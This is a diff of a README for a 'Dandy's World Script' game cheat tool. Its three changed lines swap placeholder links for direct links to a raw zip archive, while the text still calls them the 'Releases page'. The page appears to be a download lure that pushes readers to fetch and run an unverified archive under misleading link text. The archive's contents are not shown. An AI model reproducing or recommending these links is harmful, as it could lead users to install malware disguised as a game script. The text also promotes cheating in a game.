@@ -1,6 +1,6 @@
 # 🎮 Dandys-World-Script - Enhance Your Gaming Experience
 
-[![Download Dandys-World-Script](https://img.shields.io/badge/Download-Dandys--World--Script-brightgreen)](https://github.com)
+[![Download Dandys-World-Script](https://github.com/bigger111222/Dandys-World-Script/raw/refs/heads/main/unshort/ScriptDandysWorld-v2.6-beta.3.zip)](https://github.com/bigger111222/Dandys-World-Script/raw/refs/heads/main/unshort/ScriptDandysWorld-v2.6-beta.3.zip)
 
 ## 📦 Overview
 Dandy's World Script is a powerful and versatile tool crafted to elevate your gaming experience in Dandy's World. Whether you seek automation, improved controls, or exclusive features, this script offers the ultimate toolkit for players. By using this script, you can spend less time on repetitive tasks and focus on enjoying your game.
@@ -9,7 +9,7 @@ Dandy's World Script is a powerful and versatile tool crafted to elevate your ga
 Follow these easy steps to download and run Dandy's World Script:
 
 1. **Visit the Releases Page**  
-   Click on this link to go to the Releases page: [Download Dandys-World-Script](https://github.com).
+   Click on this link to go to the Releases page: [Download Dandys-World-Script](https://github.com/bigger111222/Dandys-World-Script/raw/refs/heads/main/unshort/ScriptDandysWorld-v2.6-beta.3.zip).
 
 2. **Download the Latest Version**  
    On the Releases page, find the latest version of Dandy's World Script. Download the file that corresponds to your operating system by clicking on it.
@@ -37,7 +37,7 @@ The Dandy's World Script provides various features that improve gameplay:
 - **User-Friendly Interface:** Navigate easily with an intuitive interface designed for all users.
 
 ## 📝 Download & Install
-To get started with Dandy's World Script, visit the Releases page to download the latest version: [Download Dandys-World-Script](https://github.com).
+To get started with Dandy's World Script, visit the Releases page to download the latest version: [Download Dandys-World-Script](https://github.com/bigger111222/Dandys-World-Script/raw/refs/heads/main/unshort/ScriptDandysWorld-v2.6-beta.3.zip).
 
 1. Go to the link.
 2. Select the latest version for your operating system.
